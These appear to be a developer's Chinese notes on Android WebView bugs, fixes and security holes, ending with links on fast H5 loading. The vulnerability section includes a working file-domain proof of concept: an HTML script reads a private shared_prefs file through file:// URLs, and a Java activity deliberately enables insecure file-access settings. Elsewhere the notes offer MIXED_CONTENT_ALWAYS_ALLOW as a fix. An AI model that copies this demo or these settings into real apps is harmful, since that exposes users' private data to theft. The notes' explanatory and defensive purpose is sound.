---
date created: 星期四, 九月 5日 2024, 2:23:00 凌晨
date updated: 星期一, 一月 6日 2025, 9:54:03 晚上
title: WebView坑及优化
dg-publish: true
image-auto-upload: true
feed: show
format: list
categories: [Android]
aliases: [WebView 问题汇总]
linter-yaml-title-alias: WebView 问题汇总
---

# WebView 问题汇总

## 避免 WebView 内存泄露

1. 不在 xml 中定义 Webview，而是在需要的时候在 Activity 中创建，并且 Context 使用 getApplicationgContext()

```java
LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
mWebView = new WebView(getApplicationContext());
mWebView.setLayoutParams(params);
mLayout.addView(mWebView);
```

2. 在 Activity 销毁（ WebView ）的时候，先让 WebView 加载 null 内容，然后移除 WebView，再销毁 WebView，最后置空。

```java
@Override
protected void onDestroy() {
    if (mWebView != null) {
        mWebView.loadDataWithBaseURL(null, "", "text/html", "utf-8", null);
        mWebView.clearHistory();
        
        ((ViewGroup) mWebView.getParent()).removeView(mWebView);
        mWebView.destroy();
        mWebView = null;
    }
    super.onDestroy();
}
```

## Webview-Timers 问题

> 做百度浏览器的时候一个问题

Android 应用因为加入 js 而导致 webview 一直在加载中的 bug 解决方案<br>在 Activity 或者 Fragment 中的 onResume(),onPause() 调用<br>WebView.resumeTimers()<br>WebView.pauseTimers()

注意在 ViewPager+Fragment，以及 Fragment 懒加载中，放在 Activity，避免多次调用

- <http://m.blog.csdn.net/blog/mengweiqi33/39053449>

## WebView 输入框遮住键盘

`getWindowVisibleDisplayFrame(Rect r)` 获取整个应用可以显示的区域，包括 actionbar 和状态栏，但不含设备底部的虚拟按键

```java
KeyBoardListener.getInstance(this).init();
```

代码：

```java
public class KeyBoardListener {

    private static final java.lang.String TAG = "keyboard";

    // 注意内存泄漏
    private Activity activity;

    private View mRootContent;
    private int usableHeightPrevious;
    private FrameLayout.LayoutParams frameLayoutParams;

    private static KeyBoardListener keyBoardListener;

    public static KeyBoardListener getInstance(Activity activity) {
        // if(keyBoardListener==null){
        keyBoardListener = new KeyBoardListener(activity);
        // }
        return keyBoardListener;
    }

    public KeyBoardListener(Activity activity) {
        super();
        this.activity = activity;
    }

    public void init() {

        FrameLayout content = (FrameLayout) activity
                .findViewById(android.R.id.content);

        mRootContent = content.getChildAt(0);
        mRootContent.getViewTreeObserver().addOnGlobalLayoutListener(
                new ViewTreeObserver.OnGlobalLayoutListener() {
                    public void onGlobalLayout() {
                        LogUtils.d(TAG, "onGlobalLayout...");
                        possiblyResizeChildOfContent();
                    }
                });
        frameLayoutParams = (FrameLayout.LayoutParams) mRootContent
                .getLayoutParams();

    }

    private void possiblyResizeChildOfContent() {
        int usableHeightNow = computeUsableHeight();

        LogUtils.d(TAG, "usableHeightNow:" + usableHeightNow);
        LogUtils.i("usableHeightPrevious:" + usableHeightPrevious);

        if (usableHeightNow != usableHeightPrevious) {

            // 整个屏幕高度
            int usableHeightSansKeyboard = mRootContent.getRootView().getHeight();
            LogUtils.d(TAG, "usableHeightSansKeyboard:" + usableHeightSansKeyboard);

            int heightDifference = usableHeightSansKeyboard - usableHeightNow;
            LogUtils.d(TAG, "heightDifference:" + heightDifference);

            if (heightDifference > (usableHeightSansKeyboard / 4)) { // 认为键盘已经弹出来
                // keyboard probably just became visible
                frameLayoutParams.height = usableHeightSansKeyboard - heightDifference+ ScreenUtils.getStatusHeight(RunningContext.getAppContext());
                LogUtils.d(TAG, "keyboard probably just became visible");
            } else { // 键盘没有弹出来
                // keyboard probably just became hidden
                frameLayoutParams.height = usableHeightSansKeyboard;

                LogUtils.d(TAG, "keyboard probably just became hidden");
            }
            mRootContent.requestLayout();
            usableHeightPrevious = usableHeightNow;
        }
    }

    /**
     * rootContent可以显示的高度（包括actionbar和状态栏）
     *
     * @return
     */
    private int computeUsableHeight() {
        Rect r = new Rect();
        mRootContent.getWindowVisibleDisplayFrame(r);
        return (r.bottom - r.top);
    }
}
```

- Android - 监听软键盘状态以及获取软键盘的高度<br><http://cashow.github.io/android-get-keyboard-height.html>
- Android 中监听软键盘是否弹出和获取软键盘高度<br><http://www.jianshu.com/p/4c7703361835>

## 同时用 https 和 http 加载 HTML 不加载图片解决方案（Android 5.0）

**问题 1 说明：**<br>公司之前用 http 被劫持了，webview 打开的网页里面有小广告，于是老大就把请求链接改成了 https，但是我们的图片服务器还是 http 的。这一改，对于 5.0 以下的没有影响，但是由于 5.0 是默认不支持 `mixed content` 的，即不支持同时加载 https 和 http 混合模式。<br>问题 1：现象：

> 商品列表图片加载不上来

问题 1 解决：

```java
if (Build.VERSION.SDK_INT >= 21) {
    webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
}
```

mode

- WebSettings.MIXED_CONTENT_ALWAYS_ALLOW 这种模式下，WebView 是允许一个安全站点（https）去加载另一个非安全站点内容（http）,这是 WebView 最不安全的操作模式，官方文档也不推荐使用
- WebSettings.MIXED_CONTENT_NEVER_ALLOW 默认，这种模式下，不允许一个安全站点（https）去加载另一个非安全站点内容（http）

**问题 2：**<br>webView 加载的 htttps 网页的内容,但是在 html 中的 js 中存在一个 http 请求，那么加载这个 webView 的时候出现如上错误；

> Mixed Content: The page at 'xxx' was loaded over HTTPS,
> but requested an insecure XMLHttpRequest endpoint 'xxxxxxxxx'.
> This request has been blocked;
> the content must be served over HTTPS.", source:xxxxxx

原因：从 Android5.0 开始，WebView 默认不支持同时加载 https 与 http 混合模式

## ScrollView 嵌套 WebView 问题

1. WebView 在 ScrollView 中高度不稳定末尾有大段空白问题解决
2. WebView 滑动问题；滑动流畅问题

## 百度可视化圈选导致 WebView 的 WebChromeClient 不回调

百度可视化圈选会替换掉自己的 `WebChromeClient`

```java

/**
 * 可视化圈选统计
 *
 * autoTrace：如果设置为true，打开自动埋点；反之关闭
 *
 * autoTrackWebview：
 * 如果设置为true，则自动track所有webview，如果有对webview绑定WebChromeClient，为避免影响APP本身回调，请调用trackWebView接口；
 * 如果设置为false，则不自动track webview，如需对特定webview进行统计，需要对特定webview调用trackWebView()即可。
 *
 *
 */
StatService.autoTrace(RunningContext.getAppContext(), false, false);
```

## WebView5.0 闪烁

Android WebView 在 5.0+ 上启动硬件加速，造成部分手机出现闪烁、白屏等现象

```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    CookieManager cookieManager = CookieManager.getInstance();
    cookieManager.setAcceptThirdPartyCookies(mWebView, true);
    mWebView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
}
mWebView.setDrawingCacheEnabled(false);
mWebView.getSettings().setLoadWithOverviewMode(true);
mWebView.getSettings().setJavaScriptEnabled(true);
```

## Webview 下载文件，Transfer-Encoding chunked，contentLength 为 -1

Webview 下载文件，`Transfer-Encoding chunked`，contentLength 为 -1，这是因为采用了 http 的分块，需要下载库支持分块

- [ ] HTTP 协议中的 Transfer-Encoding<br><http://network.51cto.com/art/201509/491335.htm>
- [ ] 程序 " 猿 " WebView 性能、体验分析与优化

<https://www.cnblogs.com/lys-iOS-study/p/7097774.html>

## remix webview 不显示内容

- 原因<br>Webview 嵌套在一个复杂的布局中，导致加载不出来，但 onPageFinished 回调了，具体的原因未知<br>![image.png](https://cdn.nlark.com/yuque/0/2023/png/694278/1688180205721-72c9beba-17e1-4604-b216-df9d0d17d245.png#averageHue=%2335383a&clientId=ua7520900-7354-4&from=paste&height=62&id=u008fa2de&originHeight=124&originWidth=1620&originalType=binary&ratio=2&rotation=0&showTitle=false&size=47788&status=done&style=none&taskId=u4e7e2337-11b2-493a-b38a-45e4c4a4d4c&title=&width=810)
- 解决<br>把 WebView 移动到一个嵌套不深的布局就可以了

## WebView 常见 Crash 分析及解决方案

<https://www.infoq.cn/article/Y3aHOX4XFQchP6UyisQb>

## 跨域问题

见： [[跨域问题]]

# WebView 漏洞

## [WebView密码明文保存漏洞](http://wolfeye.baidu.com/blog/)

- 威胁等级：低
- 影响版本：Android

### 漏洞描述

在使用 `WebView` 的过程中忽略了 `WebView setSavePassword`，当用户选择保存在 `WebView` 中输入的用户名和密码，则会被明文保存到应用数据目录的 `databases/webview.db` 中。如果手机被 `root` 就可以获取明文保存的密码，造成用户的个人敏感数据泄露。

### 测试方法

漏洞代码样例：

```
    ...
    //mWebView.getSettings().setSavePassword(true);
    mWebView.loadUrl("http://www.example.com");
    ...
```

如上代码中没有显示调用 `setSavePassword(false)` ，默认为 `true`[[1](http://developer.android.com/reference/android/webkit/WebSettings.html#setSavePassword(boolean))]。

### 解决方案

使用 `WebView.getSettings().setSavePassword(false)` 来禁止保存密码

### Ref

- [ ] <http://developer.android.com/reference/android/webkit/WebSettings.html#setSavePassword(boolean)>

## WebView 漏洞 -Webview 系统隐藏接口漏洞修复

```java
/**
 * webview 存在的安全漏洞
 *
 * @param webView
 */
public static void fixWebViewSecurity(WebView webView) {

    if (webView == null) {
        return;
    }

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB
            && Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR1) {
        webView.removeJavascriptInterface("searchBoxJavaBridge_");
        // webview 两个新的攻击向量 https://daoyuan14.github.io/news/newattackvector.html
        webView.removeJavascriptInterface("accessibility");
        webView.removeJavascriptInterface("accessibilityTraversal");
    }
}
```

## WebView File 域漏洞

### WebView file 协议

1. setAllowFileAccess
   - 当开启此设置的时候，将允许 WebView 加载 File 域下的文件 (`file://`)
   - AndroidQ(Android10.0) 及以前默认是 true；AndroidQ 后默认为 false
2. setAllowFileAccessFromFileURLs

本设置在 Android 4.1 版本默认值为 False，如果开启了此设置将允许 file url 加载的 JavaScript 读取其他的本地文件。

3. setAllowUniversalAccessFromFileURLs

通过此 API 可以设置是否允许通过 file url 加载的 Javascript 可以访问其他的源，包括其他的文件和 http，https 等其他的源。本设置在 Android 4.1 以后的版本默认为 False。当此设置为 True 的时候，将无视 setFileAccessFromFileURLs 的状态；

4. 安全问题

setAllowFileAccessFromFileURLs 和 setAllowUniversalAccessFromFileURLsAPI 这两个 file 相关的操作会导致应用克隆漏洞，setAllowFileAccess 有没有开启没关系（可以开启 file 域，不过要设置 file 路径的白名单）

### file 域攻击示例：获取外部存储 shared_prefs 中的数据

- html

```html
<!DOCTYPE html>
<html>
     <script>
       function stealfile() {
           var file="file:///data/data/me.hacket.assistant.samples/shared_prefs/WebViewChromiumPrefs.xml";
           var xmlHttpReq = new XMLHttpRequest();
           xmlHttpReq.onreadystatechange = function() {
               if (xmlHttpReq.readyState == 4) {
                   if (xmlHttpReq.responseText.length < 1) {
                       alert(file);
                       stealfile();
                   } else{
                       alert(xmlHttpReq.responseText);
                   }
               }
           }

           xmlHttpReq.open("GET",file);
           xmlHttpReq.send(null);
       }
       setTimeout(stealfile,4000);
     </script>
     <body>
          4秒后将从file:///data/data/me.hacket.assistant.samples/shared_prefs/WebViewChromiumPrefs.xml中读取数据，alert出来
     </body>
</html>
```

- Java 代码

```java
public class SetAllowAccessFileActivity extends AppCompatActivity {
    private WebView mWebview;
    private Uri mUri;
    private String url;
    @SuppressLint("JavascriptInterface")
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_set_allow_access_file);

        mWebview = (WebView) findViewById(R.id.webview);
        // Using setJavaScriptEnabled can introduce XSS vulnerabilities into your application, review carefully
        mWebview.getSettings().setJavaScriptEnabled(true);

        // None of the methods in the added interface (JSBridge) have been annotated with @android.webkit.JavascriptInterface; they will not be visible in API 17
        mWebview.addJavascriptInterface(new JSBridge(), "WE");

        mWebview.getSettings().setAllowFileAccess(true);
        mWebview.getSettings().setAllowFileAccessFromFileURLs(true);
        mWebview.getSettings().setAllowUniversalAccessFromFileURLs(true);
        mWebview.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
                return super.onJsAlert(view, url, message, result);
            }
        });

        // 格式规定为:file:////android_asset/文件名.html
        mWebview.loadUrl("file:android_asset/html/attack.html");
    }

    class JSBridge {
        public String onButtonClick(String text) {
            final String str = text;
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Log.e("hacket", "onButtonClick: text= " + str);
                    Toast.makeText(getApplicationContext(), "onButtonClick: text= " + str, Toast.LENGTH_LONG).show();
                }
            });

            return "This text is returned from Java layer. js text = " + text;
        }

        public void onImageClick(String url, int width, int height) {
            final String str = "onImageClick: text= " + url + " width = " + width + " height = " + height;
            Log.e("hacket", str);
            runOnUiThread(() -> Toast.makeText(getApplicationContext(), str, Toast.LENGTH_LONG).show());
        }
    }
}
```

- 效果

![image.png](https://cdn.nlark.com/yuque/0/2023/png/694278/1694942922558-97f00ab8-473b-4ff8-8080-57e9dfc5ff32.png#averageHue=%23868686&clientId=ufcdebd0b-d7de-4&from=paste&height=651&id=u0014e18d&originHeight=2400&originWidth=1080&originalType=binary&ratio=2&rotation=0&showTitle=false&size=173321&status=done&style=none&taskId=u0c0ad7bf-378a-4447-978c-3640e2e198b&title=&width=293)

- 由于 File 域的设置，导致了加载的本地文件也可以加载 JavaScript 读取本地文件；该攻击页面就是利用这个功能让 APP 去加载沙箱中的私有文件，造成了文件的泄漏。
- 在上面的 Demo 中只是使用了 alert 将内容展示了出来，实际上利用 XMLHttpRequest 我们可以将里面的内容发送到攻击者配置好的服务器中，造成进一步的危害

### Webview File 域攻击总结

- 对于不需要使用 file 协议的应用，禁用 file 协议 setAllowFileAccess(false)；如果需要开启，对访问的 file 做白名单控制
- 如非特殊情况，setAllowFileAccessFromFileURLs 和 setAllowUniversalAccessFromFileURLs 设置为 false
- 对于 Javascript Enable 的问题，看到这个策略感觉还是很不错的

```java
setAllowFileAccess(true);                             //设置为 false 将不能加载本地 html 文件
setAllowFileAccessFromFileURLs(false);
setAllowUniversalAccessFromFileURLs(false);
if (url.startsWith("file://") {
    setJavaScriptEnabled(false);
} else {
    setJavaScriptEnabled(true);
}
```

- 将不必要导出的组件设置为不导出
- 对于 WebView 传入的 URL 做严格的校验，特别是导出组件；

### Ref

- [x] [WebView File域信息泄漏(一)](https://n1rv0us.github.io/2019/11/11/WebView-File%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-%E4%B8%80/)
- [x] [WebView File域信息泄漏(二)](https://n1rv0us.github.io/2019/11/11/WebView-File%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-%E4%BA%8C/)
- [x] [Android WebView File域攻击杂谈- 路人甲](https://wooyun.js.org/drops/Android%20WebView%20File%E5%9F%9F%E6%94%BB%E5%87%BB%E6%9D%82%E8%B0%88.html)

## Ref

### 你不知道的 Android WebView 使用漏洞

<https://www.jianshu.com/p/3a345d27cd42>

# H5 秒开实践

- [ ] Android H5 秒开方案调研—今日头条 H5 秒开方案详解<br><https://yuweiguocn.github.io/android-h5/>

<https://mp.weixin.qq.com/s/AqQgDB-0dUp2ScLkqxbLZg> 百度 APP-Android H5 首屏优化实践

<https://segmentfault.com/a/1190000010711024> 腾讯祭出大招 VasSonic，让你的 H5 页面首屏秒开

<https://juejin.cn/post/6844903673697402887> Android Webview H5 秒开方案实现

<https://github.com/didi/booster/blob/master/booster-transform-webview>

<https://github.com/Tencent/VasSonic>
